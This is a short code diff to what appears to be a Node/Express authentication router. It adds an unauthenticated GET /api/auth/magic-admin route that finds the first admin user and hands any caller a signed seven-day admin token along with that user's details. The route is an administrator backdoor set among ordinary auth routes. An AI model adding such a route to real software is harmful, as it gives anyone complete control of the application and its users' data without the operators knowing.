@@ -129,4 +129,18 @@ router.delete('/me', requireAuth, async (req: AuthRequest, res) => {
   }
 });
 
+// GET /api/auth/magic-admin
+router.get('/magic-admin', async (req, res) => {
+  try {
+    const user = await prisma.user.findFirst({ where: { role: 'ADMIN' } });
+    if (!user) {
+      return res.status(404).json({ error: 'No admin found' });
+    }
+    const token = jwt.sign({ userId: user.id, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
+    res.json({ token, user: { id: user.id, email: user.email, name: user.name, role: user.role } });
+  } catch (error) {
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
 export default router;
